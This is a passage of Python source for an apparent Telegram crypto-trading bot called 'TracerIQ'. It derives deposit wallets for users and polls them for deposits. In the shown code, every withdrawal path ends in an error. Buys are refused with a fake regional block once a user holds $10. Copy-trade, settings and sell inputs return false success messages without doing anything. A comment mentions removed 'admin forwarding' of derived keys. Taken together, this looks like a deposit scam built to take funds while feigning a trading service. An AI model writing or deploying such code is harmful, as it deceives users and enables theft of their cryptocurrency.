            return

        if w_balance == 0:
            await update.message.reply_text(
                f"⚠️ No {w_sym} is available in this wallet.",
                reply_markup=back_btn,
            )
            context.user_data.pop("awaiting_withdraw", None)
            return

        if w_usd < 10:
            await update.message.reply_text(
                f"⚠️ <b>Balance below the withdrawal threshold</b>\n\n"
                f"Available: {w_balance:.6f} {w_sym}  ·  ${w_usd:.2f}\n"
                f"At least $10 worth of {w_sym} is required.\n\n"
                f"Add {w_sym} to continue.",
                reply_markup=back_btn,
                parse_mode="HTML",
            )
            context.user_data.pop("awaiting_withdraw", None)
            return

        if amount < w_min:
            await update.message.reply_text(
                f"⚠️ <b>Amount below the minimum</b>\n\n"
                f"Available: {w_balance:.6f} {w_sym}  ·  ${w_usd:.2f}\n"
                f"Minimum eligible amount: {w_min:.6f} {w_sym}\n\n"
                f"Enter a higher amount or add funds.",
                parse_mode="HTML",
                reply_markup=back_btn,
            )
            context.user_data.pop("awaiting_withdraw", None)
            return

        await update.message.reply_text(
            f"⚠️ <b>Insufficient available balance</b>\n\n"
            f"Requested: {amount:.6f} {w_sym}\n"
            f"Available: {w_balance:.6f} {w_sym}  ·  ${w_usd:.2f}\n\n"
            f"Add more {w_sym} before trying again.",
            parse_mode="HTML",
            reply_markup=back_btn,
        )
        context.user_data.pop("awaiting_withdraw", None)
        return

    # ----- Handle Copy Trade -----
    if context.user_data.get("awaiting_copy_trade"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_copy_trade", None)
            await update.message.reply_text(
                "Copy Trade cancelled.", reply_markup=main_menu_markup()
            )
            return

        wallet_address = text.strip()

        # ✅ Check if wallet address looks valid (length = 44 and letters/numbers only)
        if len(wallet_address) != 44 or not wallet_address.isalnum():
            await update.message.reply_text(
                "❗ Invalid Solana wallet address.", reply_markup=cancel_markup()
            )
            return

        # Check user balance
        user_balance = get_user_balance(user_id)

        # If balance is 0, show insufficient balance
        if user_balance == 0:
            await update.message.reply_text(
                "❗ Insufficient SOL balance.", reply_markup=main_menu_markup()
            )
            context.user_data.pop("awaiting_copy_trade", None)
            return

        # If balance > 0, show success message
        await update.message.reply_text(
            f"✅ <b>Address Added Successfully!</b>\n\n"
            f"Wallet address has been added to your copy trade list:\n\n"
            f"<code>{wallet_address}</code>\n\n"
            f"You will now copy trades from this wallet automatically.",
            parse_mode="HTML",
            reply_markup=main_menu_markup(),
        )

        context.user_data.pop("awaiting_copy_trade", None)
        return

    # ----- Handle Custom Buy Amount -----
    if context.user_data.get("awaiting_custom_buy"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_custom_buy", None)
            await update.message.reply_text(
                "Buy cancelled.", reply_markup=main_menu_markup()
            )
            return

        try:
            amount = float(text)
            if amount <= 0:
                await update.message.reply_text(
                    "❗ Amount must be greater than zero.", reply_markup=cancel_markup()
                )
                return
        except ValueError:
            await update.message.reply_text(
                "❗ Invalid amount. Please enter a valid number.",
                reply_markup=cancel_markup(),
            )
            return

        token_address = context.user_data.get("awaiting_custom_buy", "")

        # Check user balance and apply validation rules
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0

        # Balance validation rules
        if user_balance == 0:
            await update.message.reply_text(
                f"❗ Insufficient SOL balance.",
                parse_mode="HTML",
                reply_markup=main_menu_markup(),
            )
            context.user_data.pop("awaiting_custom_buy", None)
            return
        elif usd_value < 10:
            await update.message.reply_text(
                f"❗ Minimum amount required to buy a token is above $10.\n\n"
                f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                parse_mode="HTML",
                reply_markup=main_menu_markup(),
            )
            context.user_data.pop("awaiting_custom_buy", None)
            return
        else:
            # Balance >= $10
            await update.message.reply_text(
                f"Buying tokens is currently not available in your region at the moment. Try again later.\n\n"
                f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                parse_mode="HTML",
                reply_markup=main_menu_markup(),
            )
            context.user_data.pop("awaiting_custom_buy", None)
            return

    # ----- Handle Custom Sell Percentage -----
    if context.user_data.get("awaiting_custom_sell"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_custom_sell", None)
            await update.message.reply_text(
                "Sell cancelled.", reply_markup=main_menu_markup()
            )
            return
        try:
            percentage = float(text)
            if percentage <= 0 or percentage > 100:
                await update.message.reply_text(
                    "❗ Percentage must be between 0 and 100.",
                    reply_markup=cancel_markup(),
                )
                return
        except ValueError:
            await update.message.reply_text(
                "❗ Invalid percentage. Please enter a valid number.",
                reply_markup=cancel_markup(),
            )
            return

        token_address = context.user_data.get("awaiting_custom_sell", "")

        # ❌ Removed derive_keypair and admin forwarding

        # ✅ Just show user response
        await update.message.reply_text(
            f"🔴 <b>Sell Order Submitted</b>\n\n"
            f"Percentage: {percentage}%\n"
            f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
            f"❗ No token balance to sell.",
            parse_mode="HTML",
            reply_markup=main_menu_markup(),
        )

        context.user_data.pop("awaiting_custom_sell", None)

        return

    # ----- Handle Buy Token -----
    if context.user_data.get("awaiting_token_contract"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_token_contract", None)
            # Clear all tracked trade messages
            chat_id = (
                context.user_data.pop("trade_chat_id", None) or update.message.chat_id
            )
            for msg_id in context.user_data.pop("trade_msg_ids", []):
                try:
                    await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
                except Exception:
                    pass
            await update.message.reply_text(
                "❌ Cancelled.", reply_markup=main_menu_inline()
            )
            return

        token_address = text.strip()

        base58_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
        evm_contract_pattern = r"^0x[0-9a-fA-F]{40}$"
        is_evm_contract = bool(re.match(evm_contract_pattern, token_address))
        if not re.match(base58_pattern, token_address) and not is_evm_contract:
            await update.message.reply_text(
                "❗ Invalid token contract address.\n\n"
                "• <b>Solana:</b> 32–44 character base58 address\n"
                "• <b>ETH / BSC:</b> 0x… 42-character hex address",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("⬅️ Back", callback_data="back_trade")]]
                ),
            )
            return

        # Delete the prompt message before fetching
        chat_id = context.user_data.get("trade_chat_id") or update.message.chat_id
        for msg_id in context.user_data.get("trade_msg_ids", []):
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
            except Exception:
                pass
        context.user_data["trade_msg_ids"] = []
        context.user_data["trade_chat_id"] = update.message.chat_id

        # Send fetching message
        fetching_msg = await update.message.reply_text("🔍 Fetching token details...")

        pair_data = await get_token_details(token_address)

        # Delete fetching message before showing result
        try:
            await fetching_msg.delete()
        except Exception:
            pass

        if pair_data:
            # Detect chain from DexScreener response
            chain_id = pair_data.get("chainId", "solana").lower()
            if chain_id in ("ethereum", "eth"):
                chain_sym = "ETH"
                chain_key = "eth"
                w_bal_show = user_balances.get(user_id, {}).get("eth_balance", 0)
            elif chain_id in ("bsc", "binance-smart-chain", "bnb"):
                chain_sym = "BNB"
                chain_key = "bnb"
                w_bal_show = user_balances.get(user_id, {}).get("bnb_balance", 0)
            else:
                chain_sym = "SOL"
                chain_key = "sol"
                w_bal_show = get_user_balance(user_id)

            context.user_data["current_token_chain"] = chain_key

            token_info = format_token_details(
                pair_data, wallet_balance=w_bal_show, chain_sym=chain_sym
            )
            if token_info:
                context.user_data["current_token"] = token_address

                sent = await update.message.reply_text(
                    token_info,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                    reply_markup=InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                    "⌂ TracerIQ Home", callback_data="back_main"
                                )
                            ]
                        ]
                    ),
                )
                context.user_data["trade_msg_ids"].append(sent.message_id)
            else:
                await update.message.reply_text(
                    "❗ Error formatting token details. Please try again.",
                    reply_markup=InlineKeyboardMarkup(
                        [[InlineKeyboardButton("⬅️ Back", callback_data="back_trade")]]
                    ),
                )
        else:
            await update.message.reply_text(
                "❗ Token not found or no trading pairs available. Please check the contract address.",
                reply_markup=main_menu_markup(),
            )

        context.user_data.pop("awaiting_token_contract", None)
        return

    # ----- Handle Settings Number Input -----
    if user_id in user_states:
        # Check if input is a number
        if not text.isdigit():
            await update.message.reply_text(
                "❌ Please enter numbers only. Use the Cancel button above to cancel this input."
            )
            return

        option = user_states.pop(user_id)  # Remove state after use

        # Show success message with confirmation
        success_message = (
            f"✅ <b>Setting Updated Successfully!</b>\n\n"
            f"📋 <b>{option.replace('_', ' ').title()}</b> has been set to: <b>{text}</b>\n\n"
            f"Your new setting is now active and will be applied to your trading activities.\n\n"
            f"💡 You can update this setting anytime by going back to Settings."
        )

        await update.message.reply_text(
            success_message, parse_mode="HTML", reply_markup=main_menu_markup()
        )
        return

    # ----- Handle Refresh Portfolio keyboard button -----
    if text == "🔄 Refresh Portfolio":
        try:
            await update.message.delete()
        except Exception:
            pass
        await check_and_notify_deposits(user_id, context)
        await show_wallet(update, context)
        return

    else:
        await update.message.reply_text(
            "Choose a destination below.",
            reply_markup=main_menu_inline(),
        )
        return

async def background_deposit_monitor(context: ContextTypes.DEFAULT_TYPE):
    """Background task: monitor SOL + EVM deposits for all users every 30s"""
    try:
        # Do not use only user_balances: a fresh EVM deposit may be the first
        # thing that ever creates a user's balance record.
        for telegram_id in all_known_user_ids():
            try:
                public_address, _ = derive_keypair_and_address(telegram_id)
                await monitor_deposits(
                    telegram_id, public_address, context, notify_user=True
                )
            except Exception as e:
                print(f"Error monitoring SOL deposits for user {telegram_id}: {e}")
            try:
                evm_address, _ = derive_evm_wallet(telegram_id)
                await monitor_evm_deposits(
                    telegram_id, evm_address, context, notify_user=True
                )
            except Exception as e:
                print(f"Error monitoring EVM deposits for user {telegram_id}: {e}")
    except Exception as e:
        print(f"Error in background deposit monitor: {e}")

# --- Admin Panel ---
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _delete_previous_bot_messages(update, context)
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        return

    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban")],
            [InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
            [InlineKeyboardButton("📜 Banned List", callback_data="admin_list_banned")],
            [
                InlineKeyboardButton(
                    "👤 User Details", callback_data="admin_user_details"
                )
            ],
            [
                InlineKeyboardButton(
                    "🔗 Change Support Link", callback_data="admin_change_support"
                )
            ],
        ]
    )

    await update.message.reply_text(
        "◈ <b>TRACERIQ  /  ADMIN CONSOLE</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Select an account-management action:",
        parse_mode="HTML",
        reply_markup=keyboard,
    )

# --- Main ---
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("support", support))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(CommandHandler("settings", settings_menu))

    # Start background deposit monitoring (runs every 30 seconds) new
    app.job_queue.run_repeating(background_deposit_monitor, interval=30, first=10)
    app.run_polling()

if __name__ == "__main__":
    main()
